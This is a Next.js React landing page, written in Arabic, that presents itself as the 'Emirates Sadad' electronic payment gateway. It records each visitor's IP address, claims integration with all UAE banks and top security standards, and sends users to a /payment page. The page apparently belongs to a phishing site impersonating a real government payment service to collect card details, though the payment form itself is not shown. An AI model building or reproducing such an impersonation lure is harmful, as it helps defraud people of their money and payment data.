'use client' // <-- ضروري لاستخدام useRouter

import Image from "next/image";
import { useRouter } from 'next/navigation';
import { useEffect, useState } from 'react';

export default function Home() {
  const router = useRouter();
  const [ip, setIp] = useState('جاري التحميل...');
  
  // جلب IP من API
  useEffect(() => {
    const fetchIp = async () => {
      try {
        const response = await fetch('/api/ip');
        const data = await response.json();
        setIp(data.ip);
        console.log('IP:', data.ip);
      } catch (error) {
        console.error('خطأ في جلب IP:', error);
        setIp('غير متاح');
      }
    };
    
    fetchIp();
  }, []);
  
  const handleClick = () => {
    router.push("/payment");
  }
  
  return (
    <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 lg:p-24 bg-gray-50">
      {/* البطاقة العلوية */}
      <div className="z-10 w-full max-w-5xl mx-auto rounded-lg shadow-xl bg-white/95 backdrop-blur-sm p-6 md:p-10 border border-gray-100">
        <Image
          src="/icondubi.webp"
          alt="بوابة سداد الامارات"
          width={120}
          height={120}
          priority
          className="mx-auto w-24 h-24 md:w-32 md:h-32 lg:w-36 lg:h-36"
        />
        <p className="text-2xl md:text-3xl lg:text-4xl text-[#008000] mt-4 font-bold text-center">
          بوابة سداد الامارات
        </p>
        <p className="text-base md:text-lg text-gray-600 mt-2 text-center">
          الدفع الإلكتروني الآمن
        </p>
      </div>
      
      {/* البطاقة السفلية */}
      <div className="z-10 w-full max-w-5xl mx-auto p-6 md:p-8 lg:p-10 rounded-lg shadow-xl bg-white mt-4 md:mt-5">
        <div className="flex flex-col items-center text-center">
          {/* الشعار - داخل كارد */}
          <div className="mb-6 p-4 md:p-6 bg-gray-50 rounded-xl border border-gray-200 shadow-sm w-full flex justify-center">
            <Image
              src="/image.png"
              alt="شعار سداد الامارات"
              width={420}
              height={120}
              priority
              className="shadow-md object-cover w-full h-auto max-h-48 md:max-h-60 lg:max-h-80"
            />
          </div>
          
          {/* العنوان */}
          <h1 className="text-2xl md:text-3xl lg:text-4xl xl:text-5xl font-bold text-[#008000] mb-4 md:mb-6">
            عن سداد الإمارات
          </h1>
          
          {/* المحتوى */}
          <div className="space-y-3 md:space-y-4 text-right max-w-3xl mx-auto w-full">
            <p className="text-sm md:text-base lg:text-lg text-gray-700 leading-relaxed">
              سداد الإمارات هي منصة دفع إلكتروني آمنة وسهلة الاستخدام تتيح للمواطنين والمقيمين في دولة الإمارات العربية المتحدة دفع فواتيرهم ورسومهم الحكومية والخاصة بكل يسر وأمان.
              تتميز المنصة بتكاملها مع جميع البنوك المحلية وتوفرها على أعلى معايير الأمان والخصوصية لضمان سلامة معاملاتك المالية.
            </p>
          </div>
          
          <button 
            onClick={handleClick} 
            className="mt-6 md:mt-8 px-6 md:px-8 py-3 bg-[#008000] text-white rounded-lg shadow-md hover:bg-[#006000] transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-[#008000] focus:ring-offset-2 w-full md:w-[90%] lg:w-[80%] text-base md:text-lg font-semibold"
          >
            بدء الخدمة
          </button>
        </div>
      </div>
    </main>
  );
}
